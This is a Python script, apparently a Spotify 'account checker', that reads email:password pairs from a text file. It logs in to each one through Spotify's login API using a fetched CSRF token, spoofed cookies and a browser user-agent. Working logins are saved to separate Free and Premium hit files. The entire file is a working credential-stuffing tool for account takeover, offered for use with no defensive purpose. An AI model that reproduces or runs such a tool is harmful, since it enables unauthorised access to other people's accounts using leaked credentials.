import requests
import os.path
from os import path

LOGO="""

    __  _________ _____ _______   __   ____  _________    ____  __    ____  ________ __
   / / / / ____(_) ___// ____/ | / /  / __ \/ ____/   |  / __ \/ /   / __ \/ ____/ //_/
  / /_/ / __/ / /\__ \/ __/ /  |/ /  / / / / __/ / /| | / / / / /   / / / / /   / ,<   
 / __  / /___/ /___/ / /___/ /|  /  / /_/ / /___/ ___ |/ /_/ / /___/ /_/ / /___/ /| |  
/_/ /_/_____/_//____/_____/_/ |_/  /_____/_____/_/  |_/_____/_____/\____/\____/_/ |_|  
                                                                                       

"""

print(LOGO)
print('BY https://GitHub.COM/heisenberg-official')

def GET_CSRF() :
    CSRF_REQUEST = requests.get('https://accounts.spotify.com')
    if CSRF_REQUEST.status_code == 200:
        return CSRF_REQUEST.cookies.get("csrf_token")

if(path.exists('AccountList.txt') == True) :
    foundFile = True
else :
    print('AccountList.txt File Not Found [ Create AccountList.txt File First ]')
    exit()

f = open("AccountList.txt", "r")
Accounts = f.read()

if(Accounts == '') :
    print('No Accounts Found IN The File [ Add Accounts IN The Following Format user@email.com:password ]')
    exit()
Accounts= Accounts.split('\n')
f.close()

for x in range(len(Accounts)):
    Account = Accounts[x]
    Account = Account.split(':')

    Username = Account[0]
    Password = Account[1]

    CSRF_Token = GET_CSRF()

    cookies =   {
		"fb_continue" : "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F",
		"sp_landing" : "play.spotify.com%2F",
		"sp_landingref" : "https%3A%2F%2Fwww.google.com%2F",
		"user_eligible" : "0",
		"spot" : "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D",
		"sp_t" : "ac1439ee6195be76711e73dc0f79f89",
		"sp_new" : "1",
		"csrf_token" : CSRF_Token,
		"__bon" : "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=",
		"remember" : "false@false.com",
		"_ga" : "GA1.2.153026989.1498061376",
		"_gid" : "GA1.2.740264023.1498061376"
		}

    headers =   {
		"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
		"Accept" : "application/json, text/plain",
		"Content-Type": "application/x-www-form-urlencoded"
		}

    params =    {
		'remember':'true',
		'username':Username,
		'password':Password,
		'csrf_token':CSRF_Token
		}

    session = requests.Session()
    req = session.post(url = 'https://accounts.spotify.com/api/login', data = params, cookies = cookies, headers = headers)

    if('displayName' in req.text) :
        comboWorking = True
        req = session.get('https://www.spotify.com/uk/account/subscription/')
        if('Spotify Free' in req.text) :
            free = open("FreeHits.txt", "a+")
            print('[FREE-ACCOUNT] '+Username+':'+Password)
            free.write(Username+':'+Password+'\n')
            free.close()
        else :
            premium = open("Premium.txt", "a+")
            print('[PREMIUM-ACCOUNT] '+Username+':'+Password)
            premium.write(Username+':'+Password+'\n')
            premium.close()

    else :
        notworking = open("Invalid.txt", "a+")
        comboWorking = False
        print('[INVALID-ACCOUNT] '+Username+':'+Password)
        notworking.write(Username+':'+Password+'\n')
        notworking.close()
